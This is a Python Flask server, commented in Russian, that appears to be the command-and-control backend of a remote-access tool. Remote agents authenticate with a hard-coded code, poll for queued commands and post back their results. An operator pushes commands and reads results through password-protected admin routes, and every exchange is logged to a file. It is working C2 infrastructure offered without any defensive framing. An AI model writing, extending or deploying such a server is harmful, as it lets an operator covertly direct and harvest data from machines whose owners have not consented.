import datetime
import logging
from flask import Flask, request, jsonify

app = Flask(__name__)

# Настройки
ADMIN_PASS = "MY_ADMIN_PASSWORD"
AGENT_CODE = "COSMOS0611"
LOG_FILE = "zenith_history.log"

# Отключаем мусор Flask в консоли
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

storage = {"task": "none", "result": "Ожидание..."}

def save_to_log(event, data):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {event}:\n{data}\n{'-'*50}\n")

@app.route('/get_task', methods=['GET'])
def agent_get():
    if request.headers.get('X-Secret-Auth') != AGENT_CODE:
        return "Auth Fail", 403
    task = storage["task"]
    if task != "none":
        save_to_log("COMMAND SENT TO AGENT", task)
        storage["task"] = "none"
    return task

@app.route('/send_result', methods=['POST'])
def agent_post():
    if request.headers.get('X-Secret-Auth') != AGENT_CODE:
        return "Auth Fail", 403
    res = request.data.decode('utf-8', errors='ignore')
    storage["result"] = res
    save_to_log("RESULT RECEIVED FROM AGENT", res)
    return "OK"

@app.route('/admin/push', methods=['POST'])
def admin_push():
    if request.headers.get('Admin-Auth') != ADMIN_PASS:
        return "No", 403
    storage["task"] = request.json.get("cmd", "none")
    return "OK"

@app.route('/admin/pull', methods=['GET'])
def admin_pull():
    if request.headers.get('Admin-Auth') != ADMIN_PASS:
        return "No", 403
    return jsonify({"result": storage["result"]})

if __name__ == '__main__':
    print(f"[*] Server started. Logging to {LOG_FILE}")
    app.run(host='0.0.0.0', port=43445)